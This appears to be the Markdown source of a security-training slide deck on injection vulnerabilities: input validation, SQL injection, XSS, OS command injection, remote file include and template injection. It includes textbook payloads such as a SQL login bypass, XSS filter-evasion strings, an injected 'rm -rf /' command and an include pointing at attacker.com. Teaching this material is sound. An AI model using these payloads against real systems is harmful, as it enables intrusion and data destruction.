# Injection - Improper input validation

- Inputs: data, or metadata
- Technical validation
- Business validation
- Exploitation
- Use tools for parsing/validation
<!-- .element: class="list-fragment" -->

Notes:
- metadata: file size, encoding...
- Validation: data type, expected length, meaning => limitations!
- business validation example: Webshop order - negative quantity
- exploitation: directly, or when input is reused (eg injection in firstname/lastname).
- use tools => the right one for the right case!



##==##

# Injection - SQL Injection

- Simple example
  - SELECT * FROM users WHERE login = '$login' AND password = '$hashedPassword'
  - $login = admin'; --
  - SELECT * FROM users WHERE login = 'admin'; <span style="color:#bbb">--' AND password = ''</span>
- Exploitation
<!-- .element: class="list-fragment" -->

Notes:
- exploitation: read data from other users, update/delete data, access database username, shell command execution (MS SQL)...



##==##

# Injection - SQL Injection

![](./assets/images/200-owasp-top-10/sql-injection-licence-plate.png)



##==##

# Injection - Cross-site scripting (XSS)

- Rendering of untrusted HTML data
- Reflected vs Stored
<!-- .element: class="list-fragment" -->
  - `https://example.com/results.php?confirmMessage=<script>alert('hello');</script>`
- Examples of included scripts:
<!-- .element: class="list-fragment" -->
    - `<script>alert('xss');</script>`
    - `<a href="javascript:alert('xss')">Hello</a>`
    - `<image onload="javascript:alert('xss')">Hello</a>`
    - `<scriscriptpt>alert(1)</scscriptript>`
    - `<LINK REL="stylesheet" HREF="javascript:alert('XSS');">`
    - `<DIV STYLE="background-image: url(javascript:alert('XSS'))">`
    - ... (and many [other examples](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) )
<!-- .element: class="list-fragment" -->

Notes:
- untrusted data => rendered directly or later, by a victim
- reflected = non-persistent
- countermeasure:
  - CSP header (content security policy) - can block allinline scripts
  - web application firewall - can detect xss attempts


##==##

# Injection - Cross-site scripting (XSS)

- XSS: many impacts!

Notes:
- steal cookies (steal session)
- trick the user to type his password
- perform actions in the name of the user
- retrieve user's personal data



##==##

# Injection - OS Command injection

```
<?php
system('ls -al /home/' . $username);
```

- username: &nbsp;&nbsp;&nbsp;`;rm -rf /`
- Final command: &nbsp;&nbsp;&nbsp;`ls -al /home/;rm -rf /`
<!-- .element: class="list-fragment" -->



##==##

# Injection - Server-side Include

``` php [1,2|3]
<?php
$dir = $_GET['module_name'];
include($dir . "/function.php");
```

- page.php?module_name=http://attacker.com
<!-- .element: class="list-fragment" -->



##==##

# Injection - Template Injection

- CSTI - Client Side Template Injection
- PHP + AngularJS project: GET /homepage
<!-- .element: class="list-fragment" -->

```
<?php
...
echo '<script src="angularjs.js"></script>';
...
echo "<div>Welcome " . $_GET["someParam"] . " !</div>";
...
```
<!-- .element: class="fragment" -->

- Value of someParam: AngularJS template expression!
<!-- .element: class="list-fragment" -->
  - `{{7*7}}`
  - `{{constructor.constructor('alert(1)')()}}`
<!-- .element: class="list-fragment" -->

Notes:
- this example: reflected. But can also be persistent.
